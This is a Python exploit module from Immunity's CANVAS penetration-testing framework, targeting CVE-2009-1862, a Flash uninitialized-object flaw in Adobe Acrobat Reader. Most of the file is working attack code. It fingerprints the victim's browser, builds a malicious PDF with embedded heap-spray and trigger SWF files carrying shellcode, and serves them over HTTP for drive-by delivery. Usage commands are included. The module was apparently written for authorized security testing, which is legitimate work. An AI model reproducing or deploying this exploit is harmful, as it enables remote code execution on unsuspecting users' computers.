##ImmunityHeader v1 
###############################################################################
## File       :  acrobat_flash.py
## Description:  
##            :  
## Created_On :  Tue Dec 29 13:07:40 2009
## Created_By :  Justin Seitz
## Modified_On:  Tue Dec 29 13:37:22 2009
## Modified_By:  Justin Seitz
##
## (c) Copyright 2009, Immunity, Inc. all rights reserved.
###############################################################################
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside
from encoder import xorencoder
from libs.ua_parser import user_agent_parser

NAME='Adobe Acrobat Flash Uninitialized object'
DESCRIPTION='Adobe Acrobat Flash Uninitialized object'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Adobe"
DOCUMENTATION['Date public']='07/22/08'
DOCUMENTATION['References']='http://www.adobe.com/support/security/advisories/apsa09-03.html'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['CVE Name']='CVE-2009-1862'
DOCUMENTATION['CVE URL']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1862'
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION["CERT Advisory"]='http://www.kb.cert.org/vuls/id/259425'
DOCUMENTATION['VersionsAffected']='10.0 and below'
DOCUMENTATION['NOTES']='Exploitation through an PDF file is more reliable than with a direct HTML/Flash exploit'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003']
PROPERTY['DELIVERY']='HTTP'
NOTES="""
Tested on:
Windows XP Professional SP2 English UP2DATE with Adobe Acrobat Reader 9.1 and Flash 10

Usage:
./commandlineInterface.py -p 5555 -v 1
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:acrobat_flash -l 10.10.11.1 -d 5555 -p 8080  
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0],
    1: ['Windows',0x42424242]
}

from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *

class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion=1
        self.badstring='\0\xff'
        self.name=NAME 
        self.htmlfilename     = 'wild.html'
        self.source_pdf       = 'Resources/blank.pdf'
        self.source_heapspray = 'Resources/acrobat_flash/heapspray.swf'
        self.source_trigger   = 'Resources/acrobat_flash/sploit.swf'
        self.dest_heapspray   = 'heapspray.swf'
        self.dest_trigger     = 'trigger.swf'
        self.dest_pdf         = 'temp.pdf'
        self.jsfilename       = 'AC_RunActiveContent.js'
        return

        
    def is_vulnerable( self, info_dict ):
        #9.0.159.0 and 10.0.22.87
        parsed = user_agent_parser.Parse(info_dict['user_agent'])
        if 'Windows' not in parsed['os']['family']:
            return 0
        
        import re
        if "IE Flash" in info_dict['plugins']:
            flash          = info_dict['plugins']['IE Flash']
            version_regex = "([\d.]*\d+)"
            match         = re.search( version_regex, flash )
            
            # If there's no match it will throw an exception
            try:
                flash_version  = match.group(0)
            except Exception:
                return 0
            
            version_list = flash_version.split(".")
            major = int(version_list[0])
            minor = int(version_list[1])
            build = int(version_list[2])
            patch = int(version_list[3])
    
            if major == 10:
                if minor == 0:
                    if build < 22:
                        return 100
                    elif build == 22 and patch <= 87:
                        return 100
            
            if major == 9:
                if minor == 0:
                    if build <= 159:
                        return 100
        return 0

    def createShellcode(self):
        return self.createWin32ClientsideSearchShellcode()

    def addRichMedia(self,page, buffer, swffilename,x1,y1,x2,y2):
        annot=DictionaryObject()

        appearance=DictionaryObject()
        appearance[NameObject("/Subtype")]=NameObject("/Form")
        appearance[NameObject("/Matrix")]=ArrayObject([NumberObject("1"), NumberObject("0"), NumberObject("0"), NumberObject("1"), NumberObject("0"), NumberObject("0")])
        appearance[NameObject("/BBox")]=ArrayObject([NumberObject("0"), NumberObject("0"), NumberObject("30"), NumberObject("30")])

        annot[NameObject('/Type')]=NameObject("/Annot")
        annot[NameObject('/Subtype')]=NameObject("/RichMedia")
        annot[NameObject('/NM')]=TextStringObject(swffilename)
        annot[NameObject('/AP')]=DictionaryObject( { NameObject("/N") : appearance } )
        annot[NameObject('/F')]=NumberObject(68)
        annot[NameObject('/Rect')]=ArrayObject([NumberObject(x1), NumberObject(y1), NumberObject(x2), NumberObject(y2)])

        data=StreamObject()
        data._data=buffer
        data[NameObject("/DL")]=NumberObject(len(buffer))
        data[NameObject("/Params")]=DictionaryObject( { NameObject("/Size"):NumberObject(len(buffer)) } )

        filespec=DictionaryObject( { NameObject("/Type"):NameObject("/Filespec"), \
                                     NameObject("/F"):TextStringObject(swffilename), \
                                     NameObject("/UF"):TextStringObject(swffilename), \
                                     NameObject("/EF"):DictionaryObject( { NameObject("/F"):data } ) } )

        #config the player
        config = DictionaryObject()
        config[NameObject("/Type")]=NameObject("/RichMediaConfiguration")
        config[NameObject("/Subtype")]=NameObject("/Flash")
        config[NameObject("/Instances")]=ArrayObject()

        instance=DictionaryObject()
        instance[NameObject("/Params")]=DictionaryObject( { NameObject("/Binding"):TextStringObject("Background") } )
        instance[NameObject("/Asset")]=filespec
        config["/Instances"].append(instance)

        #activate as soon as any part of the page that contains the annotation becomes visible, deactivate at user request
        activation = DictionaryObject( { NameObject("/Condition") : NameObject("/PO"),\
                                         NameObject("/Type") : NameObject("/RichMediaActivation"),\
                                         NameObject("/Configuration") : config } )
        deactivation = DictionaryObject( { NameObject("/Condition") : NameObject("/PC"),\
                                           NameObject("/Type") : NameObject("/RichMediaDeactivation") } )

        annot[NameObject('/RichMediaSettings')]=DictionaryObject( { NameObject("/Activation"):activation,\
                                                                               NameObject("/Deactivation"):deactivation,\
                                                                                          NameObject("/Configuration"):config } )


        annot[NameObject('/RichMediaContent')]=DictionaryObject( { NameObject("/Configurations"):ArrayObject( [ config ] ),\
                                                                   NameObject("/Assets"):\
                                                                   DictionaryObject( { \
                                                                       NameObject("/Names"):\
                                                                       ArrayObject( [ TextStringObject(swffilename), filespec ] ) \
                                                                   } ) } )

        page['/Annots'].append(annot)

        return True

    def makePDF(self):
        input=PdfFileReader(file(self.source_pdf,'rb'))

        page=input.getPage(0)
        page[NameObject("/MediaBox")]=ArrayObject((NumberObject(0),NumberObject(0),NumberObject(600),NumberObject(800)))
        page[NameObject('/Annots')]=ArrayObject()
        res = page["/Resources"].getObject()
        res[NameObject('/XObject')]=DictionaryObject()

        sc=StreamObject()
        sc[NameObject('/Filter')]=NameObject("/Test")
        sc._data='c00k'+self.shellcode
        res["/XObject"][NameObject("/I0")]=sc

        heapspray = file(self.source_heapspray,"rb").read()
        pos = 0x4ac

        sc = ''
        for i in range(0, len(self.searchcode)):

            code = struct.unpack('B', self.searchcode[i:i+1])[0]
            if code >= 0x80:
                sc += "\x60\x04\x25" + self.searchcode[i:i+1] + "\x01\x4F\x0C\x01"
            else:
                sc += "\x60\x04\x24" + self.searchcode[i:i+1] + "\x4F\x0C\x01"
        sc += "\x02" * (0x1f1c - (len(sc)+0x4ac))

        hp = heapspray[0:0x4ac] + sc + heapspray[0x1f1c:]

        self.addRichMedia(page, file(self.source_trigger,"rb").read(), "sploit.swf",0,0,30,30)
        self.addRichMedia(page, hp, "heapspray.swf",30,0,60,30)

        output=PdfFileWriter()
        output.addPage(page)
        root=output._root.getObject()
        root.update({NameObject('/Names'):input.trailer['/Root']['/Names']})
        output.write(file(self.dest_pdf,'wb'))
        return file(self.dest_pdf,'rb').read()

    def makeSWF(self):
        heapspray = file(self.source_heapspray,"rb").read()
        pos = 0x4ac

        sc = ''
        for i in range(0, len(self.searchcode)):

            code = struct.unpack('B', self.searchcode[i:i+1])[0]
            if code >= 0x80:
                sc += "\x60\x04\x25" + self.searchcode[i:i+1] + "\x01\x4F\x0C\x01"
            else:
                sc += "\x60\x04\x24" + self.searchcode[i:i+1] + "\x4F\x0C\x01"
        sc += "\x02" * (0x1f1c - (len(sc)+0x4ac))

        hp = heapspray[0:0x4ac] + sc + heapspray[0x1f1c:]

        return hp + 'c00k' + self.shellcode

    def makeJS(self):
        js="""//v1.7
// Flash Player Version Detection
// Detect Client Browser type
// Copyright 2005-2007 Adobe Systems Incorporated.  All rights reserved.
var isIE  = (navigator.appVersion.indexOf("MSIE") != -1) ? true : false;
var isWin = (navigator.appVersion.toLowerCase().indexOf("win") != -1) ? true : false;
var isOpera = (navigator.userAgent.indexOf("Opera") != -1) ? true : false;

function ControlVersion()
{
          var version;
          var axo;
          var e;

          // NOTE : new ActiveXObject(strFoo) throws an exception if strFoo isn't in the registry

          try {
          // version will be set for 7.X or greater players
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
          version = axo.GetVariable("$version");
          } catch (e) {
          }

          if (!version)
          {
          try {
          // version will be set for 6.X players only
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");

          // installed player is some revision of 6.0
          // GetVariable("$version") crashes for versions 6.0.22 through 6.0.29,
          // so we have to be careful. 

          // default to the first public version
          version = "WIN 6,0,21,0";

          // throws if AllowScripAccess does not exist (introduced in 6.0r47)		
          axo.AllowScriptAccess = "always";

          // safe to call for 6.0r47 or greater
          version = axo.GetVariable("$version");

          } catch (e) {
          }
          }

          if (!version)
          {
          try {
          // version will be set for 4.X or 5.X player
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.3");
          version = axo.GetVariable("$version");
          } catch (e) {
          }
          }

          if (!version)
          {
          try {
          // version will be set for 3.X player
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.3");
          version = "WIN 3,0,18,0";
          } catch (e) {
          }
          }

          if (!version)
          {
          try {
          // version will be set for 2.X player
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
          version = "WIN 2,0,0,11";
          } catch (e) {
          version = -1;
          }
          }

          return version;
}

// JavaScript helper required to detect Flash Player PlugIn version information
function GetSwfVer(){
          // NS/Opera version >= 3 check for Flash plugin in plugin array
          var flashVer = -1;

          if (navigator.plugins != null && navigator.plugins.length > 0) {
          if (navigator.plugins["Shockwave Flash 2.0"] || navigator.plugins["Shockwave Flash"]) {
          var swVer2 = navigator.plugins["Shockwave Flash 2.0"] ? " 2.0" : "";
          var flashDescription = navigator.plugins["Shockwave Flash" + swVer2].description;
          var descArray = flashDescription.split(" ");
          var tempArrayMajor = descArray[2].split(".");			
          var versionMajor = tempArrayMajor[0];
          var versionMinor = tempArrayMajor[1];
          var versionRevision = descArray[3];
          if (versionRevision == "") {
          versionRevision = descArray[4];
          }
          if (versionRevision[0] == "d") {
          versionRevision = versionRevision.substring(1);
          } else if (versionRevision[0] == "r") {
          versionRevision = versionRevision.substring(1);
          if (versionRevision.indexOf("d") > 0) {
          versionRevision = versionRevision.substring(0, versionRevision.indexOf("d"));
          }
          }
          var flashVer = versionMajor + "." + versionMinor + "." + versionRevision;
          }
          }
          // MSN/WebTV 2.6 supports Flash 4
          else if (navigator.userAgent.toLowerCase().indexOf("webtv/2.6") != -1) flashVer = 4;
          // WebTV 2.5 supports Flash 3
          else if (navigator.userAgent.toLowerCase().indexOf("webtv/2.5") != -1) flashVer = 3;
          // older WebTV supports Flash 2
          else if (navigator.userAgent.toLowerCase().indexOf("webtv") != -1) flashVer = 2;
          else if ( isIE && isWin && !isOpera ) {
          flashVer = ControlVersion();
          }	
          return flashVer;
}

// When called with reqMajorVer, reqMinorVer, reqRevision returns true if that version or greater is available
function DetectFlashVer(reqMajorVer, reqMinorVer, reqRevision)
{
          versionStr = GetSwfVer();
          if (versionStr == -1 ) {
          return false;
          } else if (versionStr != 0) {
          if(isIE && isWin && !isOpera) {
          // Given "WIN 2,0,0,11"
          tempArray         = versionStr.split(" "); 	// ["WIN", "2,0,0,11"]
          tempString        = tempArray[1];			// "2,0,0,11"
          versionArray      = tempString.split(",");	// ['2', '0', '0', '11']
          } else {
          versionArray      = versionStr.split(".");
          }
          var versionMajor      = versionArray[0];
          var versionMinor      = versionArray[1];
          var versionRevision   = versionArray[2];

          // is the major.revision >= requested major.revision AND the minor version >= requested minor
          if (versionMajor > parseFloat(reqMajorVer)) {
          return true;
          } else if (versionMajor == parseFloat(reqMajorVer)) {
          if (versionMinor > parseFloat(reqMinorVer))
          return true;
          else if (versionMinor == parseFloat(reqMinorVer)) {
          if (versionRevision >= parseFloat(reqRevision))
          return true;
          }
          }
          return false;
          }
}

function AC_AddExtension(src, ext)
{
          if (src.indexOf('?') != -1)
          return src.replace(/\?/, ext+'?'); 
          else
          return src + ext;
}

function AC_Generateobj(objAttrs, params, embedAttrs) 
{ 
          var str = '';
          if (isIE && isWin && !isOpera)
          {
          str += '<object ';
          for (var i in objAttrs)
          {
          str += i + '="' + objAttrs[i] + '" ';
          }
          str += '>';
          for (var i in params)
          {
          str += '<param name="' + i + '" value="' + params[i] + '" /> ';
          }
          str += '</object>';
          }
          else
          {
          str += '<embed ';
          for (var i in embedAttrs)
          {
          str += i + '="' + embedAttrs[i] + '" ';
          }
          str += '> </embed>';
          }

          document.write(str);
}

function AC_FL_RunContent(){
          var ret = 
          AC_GetArgs
          (  arguments, ".swf", "movie", "clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"
          , "application/x-shockwave-flash"
          );
          AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
}

function AC_SW_RunContent(){
          var ret = 
          AC_GetArgs
          (  arguments, ".dcr", "src", "clsid:166B1BCA-3F9C-11CF-8075-444553540000"
          , null
          );
          AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
}

function AC_GetArgs(args, ext, srcParamName, classid, mimeType){
          var ret = new Object();
          ret.embedAttrs = new Object();
          ret.params = new Object();
          ret.objAttrs = new Object();
          for (var i=0; i < args.length; i=i+2){
          var currArg = args[i].toLowerCase();    

          switch (currArg){	
          case "classid":
          break;
          case "pluginspage":
          ret.embedAttrs[args[i]] = args[i+1];
          break;
          case "src":
          case "movie":	
          args[i+1] = AC_AddExtension(args[i+1], ext);
          ret.embedAttrs["src"] = args[i+1];
          ret.params[srcParamName] = args[i+1];
          break;
          case "onafterupdate":
          case "onbeforeupdate":
          case "onblur":
          case "oncellchange":
          case "onclick":
          case "ondblclick":
          case "ondrag":
          case "ondragend":
          case "ondragenter":
          case "ondragleave":
          case "ondragover":
          case "ondrop":
          case "onfinish":
          case "onfocus":
          case "onhelp":
          case "onmousedown":
          case "onmouseup":
          case "onmouseover":
          case "onmousemove":
          case "onmouseout":
          case "onkeypress":
          case "onkeydown":
          case "onkeyup":
          case "onload":
          case "onlosecapture":
          case "onpropertychange":
          case "onreadystatechange":
          case "onrowsdelete":
          case "onrowenter":
          case "onrowexit":
          case "onrowsinserted":
          case "onstart":
          case "onscroll":
          case "onbeforeeditfocus":
          case "onactivate":
          case "onbeforedeactivate":
          case "ondeactivate":
          case "type":
          case "codebase":
          case "id":
          ret.objAttrs[args[i]] = args[i+1];
          break;
          case "width":
          case "height":
          case "align":
          case "vspace": 
          case "hspace":
          case "class":
          case "title":
          case "accesskey":
          case "name":
          case "tabindex":
          ret.embedAttrs[args[i]] = ret.objAttrs[args[i]] = args[i+1];
          break;
          default:
          ret.embedAttrs[args[i]] = ret.params[args[i]] = args[i+1];
          }
          }
          ret.objAttrs["classid"] = classid;
          if (mimeType) ret.embedAttrs["type"] = mimeType;
          return ret;
}
"""
        return js

    def makeHTML(self):        
        html="""<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Wild</title>
<script language="javascript">AC_FL_RunContent = 0;</script>
<script src="AC_RunActiveContent.js" language="javascript"></script>
</head>
<body bgcolor="#ffffff">
<script language="javascript">
            if (AC_FL_RunContent == 0) {
            alert("This page requires AC_RunActiveContent.js.");
            } else {
            AC_FL_RunContent(
            'codebase', 'http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0',
            'width', '550',
            'height', '400',
            'src', 'SWFHEAPSPRAY',
            'quality', 'high',
            'pluginspage', 'http://www.macromedia.com/go/getflashplayer',
            'align', 'middle',
            'play', 'true',
            'loop', 'true',
            'scale', 'showall',
            'wmode', 'window',
            'devicefont', 'false',
            'id', 'SWFHEAPSPRAY',
            'bgcolor', '#ffffff',
            'name', 'SWFHEAPSPRAY',
            'menu', 'true',
            'allowFullScreen', 'false',
            'allowScriptAccess','sameDomain',
            'movie', 'SWFHEAPSPRAY',
            'salign', ''
            ); //end AC code
            AC_FL_RunContent(
            'codebase', 'http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0',
            'width', '550',
            'height', '400',
            'src', 'SWFTRIGGER',
            'quality', 'high',
            'pluginspage', 'http://www.macromedia.com/go/getflashplayer',
            'align', 'middle',
            'play', 'true',
            'loop', 'true',
            'scale', 'showall',
            'wmode', 'window',
            'devicefont', 'false',
            'id', 'SWFTRIGGER',
            'bgcolor', '#ffffff',
            'name', 'SWFTRIGGER',
            'menu', 'true',
            'allowFullScreen', 'false',
            'allowScriptAccess','sameDomain',
            'movie', 'SWFTRIGGER',
            'salign', ''
            ); //end AC code
            }
</script>
<noscript>
            <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0" width="550" height="400" id="Untitled-17" align="middle">
            <param name="allowScriptAccess" value="sameDomain" />
            <param name="allowFullScreen" value="false" />
            <param name="movie" value="SWFHEAPSPRAY.swf" /><param name="quality" value="high" /><param name="bgcolor" value="#ffffff" />	<embed src="SWFHEAPSPRAY.swf" quality="high" bgcolor="#ffffff" width="550" height="400" name="SWFHEAPSPRAY" align="middle" allowScriptAccess="sameDomain" allowFullScreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
            <param name="movie" value="SWFTRIGGER.swf" /><param name="quality" value="high" /><param name="bgcolor" value="#ffffff" />	<embed src="SWFTRIGGER.swf" quality="high" bgcolor="#ffffff" width="550" height="400" name="SWFTRIGGER" align="middle" allowScriptAccess="sameDomain" allowFullScreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
            </object>
</noscript>
</body>
</html>
"""
        html = html.replace('SWFHEAPSPRAY',self.dest_heapspray[:self.dest_heapspray.find('.')])
        html = html.replace('SWFTRIGGER',self.dest_trigger[:self.dest_trigger.find('.')])
        return html

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.jsfilename):
            self.log('Serving JS file')
            b.setBody(self.makeJS())
            h.addHeader('Content-Type','text/javascript')
        elif clientheader.URL.count(self.dest_heapspray):
            self.log('Serving SWF heapspray')
            self.createShellcode()
            b.setBody(self.makeSWF())
            h.addHeader('Content-Type','application/x-shockwave-flash')
        elif clientheader.URL.count(self.dest_trigger):
            self.log('Serving SWF trigger')
            b.setBody(file(self.source_trigger,"rb").read())
            h.addHeader('Content-Type','application/x-shockwave-flash')
        elif clientheader.URL.count(self.dest_pdf):
            self.log('Serving PDF file')
            self.createShellcode()
            b.setBody(self.makePDF())
            h.addHeader('Content-Type','application/pdf')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def getArgs(self):
        self.host=self.target.interface
        self.source_pdf=self.argsDict.get('source_filename',self.source_pdf)
        self.dest_pdf=self.argsDict.get('dest_filename', self.dest_pdf)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        self.filedata=self.makePDF()
        self.log('Opening %s for output'%(self.dest_pdf))
        fd=file(self.dest_pdf,'wb+')
        fd.write(self.filedata)
        fd.close()
        self.log('Wrote to %s'%(self.dest_pdf))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
